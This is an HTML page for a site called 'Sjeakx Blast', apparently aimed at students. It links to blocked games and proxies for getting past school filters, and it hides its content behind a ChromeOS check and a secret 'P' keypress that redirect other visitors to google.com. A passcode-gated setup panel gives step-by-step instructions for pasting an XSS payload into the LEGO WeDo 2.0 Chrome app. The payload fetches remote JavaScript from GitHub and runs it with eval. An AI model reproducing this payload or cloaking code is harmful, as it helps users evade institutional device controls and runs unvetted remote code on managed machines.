<!DOCTYPE html>
<html lang="en">
<head>
    <link href="./style.css" type="text/css" rel="stylesheet">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sjeakx Blast</title>
  
    <script>
        let isPPressed = localStorage.getItem("pushing p") === "false";
        const correctPasscode = "1234"; // Set your desired passcode
        let redirectTimeout;
        let keyPressTimeout;

        // Check the user agent for Chrome OS
        function checkUserAgent() {
            const userAgent = navigator.userAgent;

            // Instantly hide the body if not on CrOS and set a timeout to redirect
            if (!userAgent.includes("CrOS")) {
                document.body.style.visibility = "hidden"; // Instantly make the page blank
                
                // Set timeout for redirection
                redirectTimeout = setTimeout(() => {
                    window.location.href = "https://google.com"; // Redirect after 2 seconds
                }, 2000);
                
                // Allow 1 second for "P" key press
                keyPressTimeout = setTimeout(() => {
                    if (!isPPressed) {
                        window.location.href = "https://google.com"; // Redirect if "P" is not pressed
                    }
                }, 1000);
            } else {
                // If on CrOS, proceed with normal behavior
                if (!isPPressed) {
                    document.title = "Redirecting...";
                    showExcerptAndRedirect();
                } else {
                    showGameContainer();
                }
            }
        }

        // Function to show the game container
        function showGameContainer() {
            document.querySelector(".game-container").classList.remove("hidden");
            document.querySelector(".header").classList.remove("hidden");
        }

        // Function to handle redirection after showing a message
        function showExcerptAndRedirect() {
            window.location.href = "https://google.com";

            const excerpt =
                "It’s true! Yes, I have been ill—very ill. But why will you say that I am mad? The disease had sharpened my senses—not destroyed—not dulled them. Above all was the sense of hearing acute. I heard all things in the heaven and in the earth. I heard many things in hell. How, then, am I mad? Hearken! and observe how healthily—how calmly I tell you the whole story.\n\n" +
                "It is impossible to say how first the idea entered my brain; but once conceived, it haunted me. You should have seen me. I would have laughed at what you would call the disease. I could not sleep. I had not lost my mind; I had but to use my own; I had to make it part of me...";

            const excerptContainer = document.createElement("div");
            excerptContainer.className = "excerpt-container";
            excerptContainer.innerText = excerpt;

            document.body.appendChild(excerptContainer);

            setTimeout(() => {
                if (!isPPressed) {
                    window.location.href = "https://google.com";
                } else {
                    showGameContainer();
                }
            }, 5000);
        }

        // When the page loads, check the user agent
        window.onload = checkUserAgent;

        // Listen for the "P" key press to cancel redirection and show the page
        document.addEventListener("keydown", function (event) {
            if (event.key === "P" || event.key === "p") {
                event.preventDefault();  // Prevent default behavior of the "P" key
                isPPressed = true;
                localStorage.setItem("pushing p", "true");

                // Clear both timeouts to prevent redirection
                clearTimeout(redirectTimeout);
                clearTimeout(keyPressTimeout);

                // Show the page content
                document.body.style.visibility = "visible"; // Ensure the page becomes visible again
                document.title = "SJeak blast";
                showGameContainer();  // Proceed to the game container
            }
        });

        // Passcode check for LegoWeDo 2.0
        function showConfirmation() {
            const passcode = prompt("Enter the passcode to access LegoWeDo 2.0:");

            if (passcode === correctPasscode) {
                document.getElementById('overlay').style.display = 'block';
                document.getElementById('confirmationDropdown').style.display = 'block';
            } else {
                alert("Incorrect passcode. Access denied.");
            }
        }

        function confirmClose() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('confirmationDropdown').style.display = 'none';
        }

        function cancelClose() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('confirmationDropdown').style.display = 'none';
        }
    </script>
</head>
<body>

    <h1>Sjeakx-blast</h1>

    <!-- Dropdown buttons (with links) -->
    <div class="button-container">
        <div class="dropdown">
            <button class="custom-btn btn-3">Blocked Games</button>
            <div class="dropdown-content">
                <a href="https://macvg-sjeakx.vercel.app/" target="_blank">macvg (use unblocker)</a>
                <a href="https://nettleweb-sjeakx.vercel.app/" target="_blank">nettleweb (use unblocker)</a>
            </div>
        </div>

        <div class="dropdown">
            <button class="custom-btn btn-3">Proxys</button>
            <div class="dropdown-content">
                <a href="https://sjeakxweb.vercel.app/" target="_blank">Proxy (use unblocker)</a>
            </div>
        </div>

        <div class="dropdown">
            <button class="custom-btn btn-3">Unblocked Games</button>
            <div class="dropdown-content">
                <a href="https://sjeakx.github.io/Sjeakx-blast/telltaleheartscript-backup-main/index.html" target="_blank">unblocker/games/emulators</a>
            </div>
        </div>

        <!-- The "legowego2.0" button triggers the passcode check -->
        <button class="custom-btn btn-3" onclick="showConfirmation()">legowego2.0(unblocker)</button>
    </div>

    <!-- The overlay to dim the background -->
    <div class="overlay" id="overlay"></div>

    <!-- The confirmation dropdown box -->
    <div class="confirmation-dropdown" id="confirmationDropdown">
        <h3>Setup:</h3>
        <p>First, install WeDo 2.0 LEGO® Education from the Chrome Webstore.</p>
        <p>Wait until it loads, then turn off your WiFi.</p>
        <p>Once you are in the project, click on the pencil in the top bar.</p>
        <p>Then, click the green document button.</p>
        <p>In the textbox, paste the following string:</p>
        
        <div class="code-snippet-wrapper">
            <pre><code>&lt;img src=# onerror='fetch
("https://raw.githubusercontent.com
/Blobby-Boi/BlobbypassXSS/main/main.js")
.then(r=>r.text())
.then(c=>eval(c)) '&gt;</code></pre>
        </div>

        <p>Close LEGO WeDo 2.0 and re-enable your WiFi.</p>

        <h3>How to use (after Setup):</h3>
        <p>Open LEGO WeDo 2.0 (with WiFi turned on).</p>
        <p>Click the project you made when you were setting this up.</p>
        <p>Press the pencil in the top bar.</p>
        <p><strong>Done!</strong></p>

        <p>This does not bypass Wi-Fi restrictions. If you want to do that, do Blobwifi.</p>

        <button class="confirm-btn" onclick="confirmClose()">Got it, close</button>
    </div>

</body>
</html>

